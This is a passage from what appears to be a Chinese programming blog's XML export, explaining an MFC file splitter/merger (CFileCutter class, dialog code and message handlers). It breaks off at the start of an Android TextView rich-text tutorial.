class="string">"\\"</span>;</span><br><span class="line">	<span class="comment">//通知用户，开始创建文件</span></span><br><span class="line">	<span class="keyword">int</span> nTotalFiles = strSourceFile.GetLength()/m_uFileSize+<span class="number">1</span>;</span><br><span class="line">	PostMessage(m_hWndNotify,WM_CUTTERSTART,nTotalFiles,TRUE);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">int</span> c_page = <span class="number">4</span>*<span class="number">1024</span>;</span><br><span class="line">	<span class="keyword">char</span> Buffer[c_page];</span><br><span class="line">	DWORD dwRead;</span><br><span class="line">	CString sDestName;</span><br><span class="line">	<span class="keyword">int</span> nPreCount = <span class="number">1</span>;</span><br><span class="line">	UINT uWriteBytes;</span><br><span class="line">	<span class="keyword">do</span> </span><br><span class="line">	&#123;</span><br><span class="line">		sDestName.Format(<span class="string">"%d__"</span>,nPreCount);</span><br><span class="line">		sDestName += sourceFile.GetFileName();</span><br><span class="line">		<span class="keyword">if</span>(!destFile.Open(strDestDir+sDestName,CFile::modeCreate | CFile::modeWrite))</span><br><span class="line">		&#123;</span><br><span class="line">			PostMessage(m_hWndNotify,WM_CUTTERSTOP,exitDestErr,nCompleted);</span><br><span class="line">			sourceFile.Close();</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		uWriteBytes = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">do</span> </span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (!m_bContinue)<span class="comment">//判断用户是不是强制结束</span></span><br><span class="line">			&#123;</span><br><span class="line">				destFile.Close();</span><br><span class="line">				sourceFile.Close();</span><br><span class="line">				<span class="keyword">if</span> (!m_bExitThread)</span><br><span class="line">				&#123;</span><br><span class="line">					PostMessage(m_hWndNotify,WM_CUTTERSTOP,exitUserForce,nCompleted);</span><br><span class="line">					<span class="keyword">return</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">//真正的进行读文件</span></span><br><span class="line">			dwRead = sourceFile.Read(Buffer,c_page);</span><br><span class="line">			destFile.Write(Buffer,dwRead);</span><br><span class="line">			uWriteBytes += dwRead;</span><br><span class="line">		&#125; <span class="keyword">while</span> (dwRead &gt; <span class="number">0</span> &amp;&amp; uWriteBytes &lt;m_uFileSize);</span><br><span class="line">		destFile.Close();</span><br><span class="line"></span><br><span class="line">		<span class="comment">//通知用户写完一个了</span></span><br><span class="line"></span><br><span class="line">		nCompleted = nPreCount++;</span><br><span class="line">		PostMessage(m_hWndNotify,WM_CUTTERSTATUS,<span class="number">0</span>,nCompleted);</span><br><span class="line">	&#125; <span class="keyword">while</span> (dwRead &gt; <span class="number">0</span>);<span class="comment">//这一步判断个人感觉写的很是聪明，说明这个文件读取完毕了</span></span><br><span class="line">	<span class="comment">//关闭源文件</span></span><br><span class="line">	sourceFile.Close();</span><br><span class="line">	<span class="comment">//通知用户，工作完成</span></span><br><span class="line">	PostMessage(m_hWndNotify,WM_CUTTERSTOP,exitSuccess,nCompleted);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> CFileCutter::DoMerge()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> nCompleted = <span class="number">0</span>;</span><br><span class="line">	CString strSourceFile = m_strSource;</span><br><span class="line">	CString strDestDir = m_strDest;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (strSourceFile.Right(<span class="number">1</span>) != <span class="string">"\\"</span>)</span><br><span class="line">		strSourceFile += <span class="string">"\\"</span>;</span><br><span class="line">	<span class="keyword">if</span> (strDestDir.Right(<span class="number">1</span>) != <span class="string">"\\"</span>)</span><br><span class="line">		strDestDir += <span class="string">"\\"</span>;</span><br><span class="line">	<span class="comment">//取得文件的名称和数量</span></span><br><span class="line"></span><br><span class="line">	CString strFileName;</span><br><span class="line">	<span class="keyword">int</span> nTotalFiles = <span class="number">0</span>;</span><br><span class="line">	CFileFind find;</span><br><span class="line">	BOOL bRet;</span><br><span class="line">	<span class="keyword">if</span> (find.FindFile(strSourceFile+<span class="string">"*.*"</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">do</span> </span><br><span class="line">		&#123;</span><br><span class="line">			bRet = find.FindNextFile();</span><br><span class="line">			<span class="keyword">if</span> (find.IsDirectory() &amp;&amp; find.IsDots())<span class="comment">//有点异议，一等回头看一下</span></span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			<span class="keyword">if</span> (find.GetFileName().Find(<span class="string">"__"</span>,<span class="number">0</span>) != <span class="number">-1</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				nTotalFiles++;</span><br><span class="line">				strFileName = find.GetFileName();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">while</span> (bRet);</span><br><span class="line">	&#125;<span class="comment">//if end</span></span><br><span class="line">	find.Close();</span><br><span class="line">	<span class="keyword">if</span> (nTotalFiles == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		PostMessage(m_hWndNotify,WM_CUTTERSTOP,exitSourceErr,nCompleted);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	strFileName = strFileName.Mid(strFileName.Find(<span class="string">"__"</span>)+<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//逐级创建目标目录</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> nPos = <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">while</span> ((nPos = strDestDir.Find(<span class="string">"\\"</span>,nPos+<span class="number">1</span>)) != <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		CreateDirectory(strDestDir.Left(nPos),<span class="literal">NULL</span>);<span class="comment">//有点问题一等看下</span></span><br><span class="line">	&#125;</span><br><span class="line">	CreateDirectory(strDestDir,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建目标文件</span></span><br><span class="line">	CFile sourceFile,destFile;</span><br><span class="line">	strDestDir += strFileName;</span><br><span class="line">	<span class="keyword">if</span> (!destFile.Open(strDestDir,CFile::modeReadWrite | CFile::modeCreate))</span><br><span class="line">	&#123;</span><br><span class="line">		PostMessage(m_hWndNotify,WM_CUTTERSTOP,exitDestErr,nCompleted);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//开始合并</span></span><br><span class="line">	PostMessage(m_hWndNotify,WM_CUTTERSTART,nTotalFiles,nCompleted);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">int</span> c_page = <span class="number">1024</span>*<span class="number">4</span>;</span><br><span class="line">	<span class="keyword">char</span> Buffer[c_page];</span><br><span class="line">	<span class="keyword">int</span> nPreCount = <span class="number">1</span>;</span><br><span class="line">	CString sSourceName;</span><br><span class="line">	DWORD dwRead;</span><br><span class="line">	<span class="keyword">do</span> </span><br><span class="line">	&#123;</span><br><span class="line">		sSourceName.Format(<span class="string">"%d__"</span>,nPreCount);</span><br><span class="line">		sSourceName += strFileName;</span><br><span class="line">		<span class="keyword">if</span>(!sourceFile.Open(strSourceFile+sSourceName,CFile::modeRead | CFile::shareDenyWrite | CFile::typeBinary))<span class="comment">//打不开失败的时候说明就没有了，这里我感觉用for循环比较好，还能提供错误处理，之后改一下。//</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 写入文件</span></span><br><span class="line">		<span class="keyword">do</span> </span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (!m_bContinue)</span><br><span class="line">			&#123;</span><br><span class="line">				sourceFile.Close();</span><br><span class="line">				destFile.Close();</span><br><span class="line">				<span class="keyword">if</span> (!m_bExitThread)</span><br><span class="line">					PostMessage(m_hWndNotify,WM_CUTTERSTOP,exitUserForce,nCompleted);</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			dwRead = sourceFile.Read(Buffer,c_page);</span><br><span class="line">			destFile.Write(Buffer,dwRead);</span><br><span class="line">		&#125; <span class="keyword">while</span> (dwRead &gt; <span class="number">0</span>);</span><br><span class="line">		sourceFile.Close();</span><br><span class="line">		nCompleted = nPreCount++;</span><br><span class="line">		PostMessage(m_hWndNotify,WM_CUTTERSTATUS,<span class="number">0</span>,nCompleted);</span><br><span class="line">	&#125; <span class="keyword">while</span> (TRUE);</span><br><span class="line">	destFile.Close();</span><br><span class="line">	<span class="comment">//通知用户，工作完成</span></span><br><span class="line">	PostMessage(m_hWndNotify,WM_CUTTERSTOP,exitSuccess,nCompleted);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实就是操作我们的文件，使用CFile这个类。<br>分割：先是打开源文件，失败的话呢投递消息，这里要POST而不是Send，然后我们再创建我们的目录，创建完毕目录之后纠正一下目标文件目录。然后我们获取一下文件理论上的道德个数，投递一个开始的消息。然后就是我们简单的初始化呢一下我们的各种信息，进入我们的循环，显示创建目标文件，创建写入的方法打开，出错的话呢就投递消息，然后在判断是不是强行终止了，强行终止的话呢我们就要关一些东西，然后投递我们的消息，然后再读源文件，在写源文件，每次读4KB，这个时候我们要读够用户传递给我们文件大小，关闭文件句柄，发送一个状态消息，一直循环，完毕之后关闭源文件，投递执行成功的消息。</p>
<p>合并：基本和我们的分割一样，显示纠正一下我们的源和目标路径，然后再找一下符合规范的文件，<code>find.IsDirectory() &amp;&amp; find.IsDots()</code>这个其实我感觉有点异议但是没碰见出错。如果一个源文件都没有，肯定要投递错误源文件的错误，在创建目录，投递一下我们要开始了，给他目标文件的大小。再就是初始化变量，进入循环打开源文件，然后判断是不是要继续，然后读写再就是和我们的分割一样了。</p>
<h2 id="类的实际调用"><a href="#类的实际调用" class="headerlink" title="类的实际调用"></a>类的实际调用</h2><p>既然我们的类写好了，实际编写的话呢无非就是类的一个调用罢了，首先我们需要配置一下我们的组件，这里就不提了，没啥太大必要，照葫芦画瓢就可以了。</p>
<h3 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// FileCutterDlg.h : 头文件</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"CFileCutter.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"CDirDialog.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"afxcmn.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// CFileCutterDlg 对话框</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CFileCutterDlg</span> :</span> <span class="keyword">public</span> CDialogEx</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 构造</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	CFileCutterDlg(CWnd* pParent = <span class="literal">NULL</span>);	<span class="comment">// 标准构造函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 对话框数据</span></span><br><span class="line">	<span class="keyword">enum</span> &#123; IDD = IDD_FILECUTTER_DIALOG &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">protected</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">DoDataExchange</span><span class="params">(CDataExchange* pDX)</span></span>;	<span class="comment">// DDX/DDV 支持</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现</span></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	HICON m_hIcon;</span><br><span class="line">	CFileCutter* m_pCutter;</span><br><span class="line">	CProgressCtrl m_Progress;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 生成的消息映射函数</span></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> BOOL <span class="title">OnInitDialog</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function">afx_msg <span class="keyword">void</span> <span class="title">OnPaint</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function">afx_msg HCURSOR <span class="title">OnQueryDragIcon</span><span class="params">()</span></span>;</span><br><span class="line">	DECLARE_MESSAGE_MAP()</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">UIControl</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function">afx_msg <span class="keyword">void</span> <span class="title">OnBnClickedSelectsplit</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function">afx_msg <span class="keyword">void</span> <span class="title">OnBnClickedSelectmergr</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function">afx_msg <span class="keyword">void</span> <span class="title">OnBnClickedSourcebrowser</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function">afx_msg <span class="keyword">void</span> <span class="title">OnBnClickedDestbrowser</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function">afx_msg <span class="keyword">void</span> <span class="title">OnBnClickedStart</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function">afx_msg <span class="keyword">void</span> <span class="title">OnBnClickedStop</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function">afx_msg <span class="keyword">void</span> <span class="title">OnBnClickedCancel</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="function">afx_msg LRESULT <span class="title">OnCutterstart</span><span class="params">(WPARAM wParam, LPARAM lParam)</span></span>;</span><br><span class="line">	<span class="function">afx_msg LRESULT <span class="title">OnCutterstop</span><span class="params">(WPARAM wParam, LPARAM lParam)</span></span>;</span><br><span class="line">	<span class="function">afx_msg LRESULT <span class="title">OnCutterstatus</span><span class="params">(WPARAM wParam, LPARAM lParam)</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>就是一个简单的引入，比较关键的就是：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">CFileCutter* m_pCutter;</span><br><span class="line">CProgressCtrl m_Progress;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">UIControl</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br></pre></td></tr></table></figure>
<p>这三个比较关键，最后一个就是用来调节UI的，其实就是判断你是不是在运行啊，是选了分割还是合并啊之类的。</p>
<h3 id="源文件"><a href="#源文件" class="headerlink" title="源文件"></a>源文件</h3><p><code>CFileCutterDlg::OnInitDialog()</code>初始化</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">m_pCutter = <span class="keyword">new</span> CFileCutter(m_hWnd);</span><br><span class="line">((CButton*)GetDlgItem(IDC_SELECTSPLIT))-&gt;SetCheck(<span class="number">1</span>);</span><br><span class="line">((CComboBox*)GetDlgItem(IDC_UINT))-&gt;AddString(<span class="string">"1"</span>);</span><br><span class="line">((CComboBox*)GetDlgItem(IDC_UINT))-&gt;AddString(<span class="string">"30"</span>);</span><br><span class="line">((CComboBox*)GetDlgItem(IDC_UINT))-&gt;AddString(<span class="string">"60"</span>);</span><br><span class="line">((CComboBox*)GetDlgItem(IDC_UINT))-&gt;SetCurSel(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//m_Progress.SubclassWindow(GetDlgItem(IDC_PROGRESS)-&gt;m_hWnd);</span></span><br><span class="line">UIControl();</span><br></pre></td></tr></table></figure>
<p>这里之前用了子类化控件的一个方法，但我实在没看到用的必要我就给注释，（其实主要是我发现报错，哈哈）<br><code>UIControl</code>函数的实现</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> CFileCutterDlg::UIControl(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">	BOOL bIsWorking = m_pCutter-&gt;IsRunning();</span><br><span class="line">	GetDlgItem(IDC_SELECTSPLIT)-&gt;EnableWindow(!bIsWorking);</span><br><span class="line">	GetDlgItem(IDC_SELECTMERGR)-&gt;EnableWindow(!bIsWorking);</span><br><span class="line">	GetDlgItem(IDC_UINT)-&gt;EnableWindow(!bIsWorking);</span><br><span class="line"></span><br><span class="line">	GetDlgItem(IDC_START)-&gt;EnableWindow(!bIsWorking);</span><br><span class="line">	GetDlgItem(IDC_STOP)-&gt;EnableWindow(!bIsWorking);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (bIsWorking)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (((CButton*)GetDlgItem(IDC_SELECTSPLIT))-&gt;GetCheck())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//分割</span></span><br><span class="line">		GetDlgItem(IDC_START)-&gt;SetWindowText(<span class="string">"分割"</span>);</span><br><span class="line">		GetDlgItem(IDC_SOURCETITLE)-&gt;SetWindowText(<span class="string">"请选择要分割的文件："</span>);</span><br><span class="line">		GetDlgItem(IDC_DESTTITLE)-&gt;SetWindowText(<span class="string">"请选择分割后保存到的文件夹"</span>);</span><br><span class="line">		GetDlgItem(IDC_UINT)-&gt;EnableWindow(TRUE);</span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//合并</span></span><br><span class="line">		GetDlgItem(IDC_START)-&gt;SetWindowText(<span class="string">"合并"</span>);</span><br><span class="line">		GetDlgItem(IDC_SOURCETITLE)-&gt;SetWindowText(<span class="string">"请选择要合并的文件夹："</span>);</span><br><span class="line">		GetDlgItem(IDC_DESTTITLE)-&gt;SetWindowText(<span class="string">"请选择合并后保存到的文件夹"</span>);</span><br><span class="line">		GetDlgItem(IDC_UINT)-&gt;EnableWindow(FALSE);</span><br><span class="line">	&#125;</span><br><span class="line">	GetDlgItem(IDC_STATUSTEXT)-&gt;SetWindowText(<span class="string">"状态显示"</span>);</span><br><span class="line">	m_Progress.SetPos(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个的话呢其实也看起来不是很难，就是通过我们的类成员函数判断是不是在运行，是选择的分割还是合并，然后初始化一些控件。</p>
<p>单选框按钮被按下的时候：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> CFileCutterDlg::OnBnClickedSelectsplit()</span><br><span class="line">&#123;</span><br><span class="line">	UIControl();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> CFileCutterDlg::OnBnClickedSelectmergr()</span><br><span class="line">&#123;</span><br><span class="line">	UIControl();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个就是当按单选框按钮被按下的时候我们进行的操作，就是用来刷新一下我们的一些UI。</p>
<p>当我们点击选择文件夹的时候：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> CFileCutterDlg::OnBnClickedSourcebrowser()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (((CButton*)GetDlgItem(IDC_SELECTSPLIT))-&gt;GetCheck())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//分割</span></span><br><span class="line">		<span class="function">CFileDialog <span class="title">sourceFile</span><span class="params">(TRUE)</span></span>;</span><br><span class="line">		<span class="keyword">if</span> (sourceFile.DoModal() == IDOK)</span><br><span class="line">		&#123;</span><br><span class="line">			GetDlgItem(IDC_EDITSOURCE)-&gt;SetWindowText(sourceFile.GetPathName());</span><br><span class="line">			GetDlgItem(IDC_EDITDEST)-&gt;SetWindowText(sourceFile.GetPathName().Left(sourceFile.GetPathName().ReverseFind(<span class="string">'.'</span>)));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//合并</span></span><br><span class="line">		CDirDialog sourceFolder;</span><br><span class="line">		<span class="keyword">if</span> (sourceFolder.DoBrowse(*<span class="keyword">this</span>) == IDOK)</span><br><span class="line">		&#123;</span><br><span class="line">			GetDlgItem(IDC_EDITSOURCE)-&gt;SetWindowText(sourceFolder.GetDirPath());</span><br><span class="line">			CString strDef = sourceFolder.GetDirPath();</span><br><span class="line">			strDef.TrimRight(<span class="string">'\\'</span>);</span><br><span class="line">			strDef = strDef + <span class="string">"\\"</span> + strDef.Mid(strDef.ReverseFind(<span class="string">'\\'</span>)+<span class="number">1</span>);</span><br><span class="line">			strDef.TrimRight(<span class="string">":"</span>);<span class="comment">//防止选择根目录</span></span><br><span class="line">			GetDlgItem(IDC_EDITDEST)-&gt;SetWindowText(strDef);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> CFileCutterDlg::OnBnClickedDestbrowser()</span><br><span class="line">&#123;</span><br><span class="line">	CDirDialog destFolder;</span><br><span class="line">	<span class="keyword">if</span> (destFolder.DoBrowse(*<span class="keyword">this</span>) == IDOK)</span><br><span class="line">	&#123;</span><br><span class="line">		GetDlgItem(IDC_EDITDEST)-&gt;SetWindowText(destFolder.GetDirPath());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个当我们点击源文件的时候我们就是先判断是风格还是合并，分割的话呢就是文件对话框，合并的话呢就是我们自己写的那个类，不要忘记导入就好了。然后比较聪明的就是：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">strDef = strDef + <span class="string">"\\"</span> + strDef.Mid(strDef.ReverseFind(<span class="string">'\\'</span>)+<span class="number">1</span>);</span><br><span class="line">strDef.TrimRight(<span class="string">":"</span>);<span class="comment">//防止选择根目录</span></span><br></pre></td></tr></table></figure>
<p>这两句，就是生成一个与我们文件夹相同的子文件夹，然后防止了这个根目录（F:\）。</p>
<p>再就是我们点击分割开始的按钮的时候：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> CFileCutterDlg::OnBnClickedStart()</span><br><span class="line">&#123;</span><br><span class="line">	CString strSource,strDest;</span><br><span class="line">	GetDlgItem(IDC_EDITSOURCE)-&gt;GetWindowText(strSource);</span><br><span class="line">	GetDlgItem(IDC_EDITDEST)-&gt;GetWindowText(strDest);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (strSource.IsEmpty() || strDest.IsEmpty())</span><br><span class="line">	&#123;</span><br><span class="line">		MessageBox(<span class="string">"文件或者文件路径不能为空"</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (((CButton*)GetDlgItem(IDC_SELECTSPLIT))-&gt;GetCheck())</span><br><span class="line">	&#123;</span><br><span class="line">		CString str;</span><br><span class="line">		GetDlgItem(IDC_UINT)-&gt;GetWindowText(str);</span><br><span class="line">		m_pCutter-&gt;StartSplit(strDest,strSource,atoi(str)*<span class="number">1024</span>*<span class="number">1024</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		m_pCutter-&gt;StartMerge(strDest,strSource);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> CFileCutterDlg::OnBnClickedStop()</span><br><span class="line">&#123;</span><br><span class="line">	m_pCutter-&gt;SuspendCutter();</span><br><span class="line">	<span class="keyword">if</span> (MessageBox(<span class="string">"确定要终止么?"</span>,<span class="literal">NULL</span>,MB_YESNO) == IDYES)</span><br><span class="line">	&#123;</span><br><span class="line">		m_pCutter-&gt;StopCutter();</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		m_pCutter-&gt;ResumeCutter();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>显示判断是否有填写源文件与目标文件夹，然后判断是分割还是合并，最后调用类的开始方法进行操作。</p>
<p>最后就是我们的消息映射：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">afx_msg LRESULT CFileCutterDlg::OnCutterstart(WPARAM wParam, LPARAM lParam)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//设置进度条范围</span></span><br><span class="line">	<span class="keyword">int</span> nTotalFiles = wParam;</span><br><span class="line">	m_Progress.SetRange32(<span class="number">0</span>,nTotalFiles);</span><br><span class="line">	UIControl();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">afx_msg LRESULT CFileCutterDlg::OnCutterstop(WPARAM wParam, LPARAM lParam)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> nErrorCode = wParam;</span><br><span class="line">	<span class="keyword">switch</span>(nErrorCode)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> CFileCutter::exitSuccess:</span><br><span class="line">		MessageBox(<span class="string">"操作成功完成"</span>,<span class="string">"成功"</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> CFileCutter::exitSourceErr:</span><br><span class="line">		MessageBox(<span class="string">"源文件出错"</span>,<span class="string">"失败"</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> CFileCutter::exitDestErr:</span><br><span class="line">		MessageBox(<span class="string">"目标出错"</span>,<span class="string">"失败"</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> CFileCutter::exitUserForce:</span><br><span class="line">		MessageBox(<span class="string">"用户终止"</span>,<span class="string">"失败"</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	UIControl();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">afx_msg LRESULT CFileCutterDlg::OnCutterstatus(WPARAM wParam, LPARAM lParam)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> nCompleted = <span class="keyword">int</span> (lParam);</span><br><span class="line">	m_Progress.SetPos(nCompleted);</span><br><span class="line">	CString s;</span><br><span class="line">	s.Format(<span class="string">"完成%d个文件"</span>,nCompleted);</span><br><span class="line">	GetDlgItem(IDC_STATUSTEXT)-&gt;SetWindowText(s);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>效应映射需要我们在类向导中进行声明，不用类向导的话呢要自己写声明和消息映射。<br>接受到开始的时候，我们需要设置进度条，然后初始化UI，停止的话呢我们要进行停止原因的判断，状态的话呢无非就是完成个数的输出。</p>
<h2 id="程序的不足"><a href="#程序的不足" class="headerlink" title="程序的不足"></a>程序的不足</h2><ol>
<li>首先我们是在合并的时候我感觉用for循环更好一些</li>
<li>这个要是能用文件映射的话呢应该可以处理更大的文件。</li>
</ol>
]]></content>
      <categories>
        <category>Win32编程</category>
      </categories>
      <tags>
        <tag>Win32编程</tag>
      </tags>
  </entry>
  <entry>
    <title>Android TextView实现富文本</title>
    <url>/2020/02/01/Android-TextView%E5%AE%9E%E7%8E%B0%E5%AF%8C%E6%96%87%E6%9C%AC/</url>
    <content><![CDATA[<h2 id="TextView实现富文本"><a href="#TextView实现富文本" class="headerlink" title="TextView实现富文本"></a>TextView实现富文本</h2><p>这个的话呢其实也是不是太难的一个操作，就是基本的加入文本，但是加入的不是简单的String类型，而是实现CharSquence接口的一个类。<br>这个好像就是用来添加富文本的，首先我们先配置XML</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">RelativeLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">"http://schemas.android.com/tools"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:paddingBottom</span>=<span class="string">"@dimen/activity_vertical_margin"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:paddingLeft</span>=<span class="string">"@dimen/activity_horizontal_margin"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:paddingRight</span>=<span class="string">"@dimen/activity_horizontal_margin"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:paddingTop</span>=<span class="string">"@dimen/activity_vertical_margin"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">tools:context</span>=<span class="string">"com.example.android_stduy1.MainActivity"</span> &gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/Tv_One"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span> </span></span><br><span 